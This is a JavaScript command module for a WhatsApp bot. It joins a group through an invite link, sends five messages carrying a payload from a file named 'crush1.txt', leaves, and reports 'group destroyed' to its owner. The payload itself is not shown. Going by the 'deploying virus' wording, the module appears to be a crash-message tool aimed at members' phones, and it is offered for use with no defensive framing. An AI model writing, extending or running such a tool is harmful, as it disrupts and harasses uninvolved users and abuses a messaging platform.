const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gc1",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        if (!args[0] || !args[0].includes("chat.whatsapp.com")) return msg.reply(fancy("🥀 provide group link."));

        try {
            const payload = fs.readFileSync('./lib/payloads/crush1.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            
            msg.reply(fancy("🥀 infiltrating group and deploying virus..."));

            // JOIN GROUP
            const jid = await conn.groupAcceptInvite(code);
            
            for (let i = 0; i < 5; i++) {
                await conn.sendPresenceUpdate('composing', jid);
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { 
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɢʀᴏᴜᴘ ꜱʏꜱᴛᴇᴍ ꜰᴀɪʟᴜʀᴇ" }
                    } 
                });
                await new Promise(r => setTimeout(r, 1000));
            }

            // LEAVE GROUP
            await conn.groupLeave(jid);

            // REPORT TO OWNER
            await conn.sendMessage(conn.user.id, { 
                text: `╭── • 🥀 • ──╮\n  ${fancy("ɢʀᴏᴜᴘ ᴅᴇꜱᴛʀᴏʏᴇᴅ")}\n╰── • 🥀 • ──╯\n\n│ ◦ ᴍɪꜱꜱɪᴏɴ: GC1\n│ ◦ ꜱᴛᴀᴛᴜꜱ: ᴇxɪᴛᴇᴅ\n└──────────────`,
                contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } }
            });

        } catch (e) {
            msg.reply(fancy("🥀 error: bot is banned or link expired."));
        }
    }
};
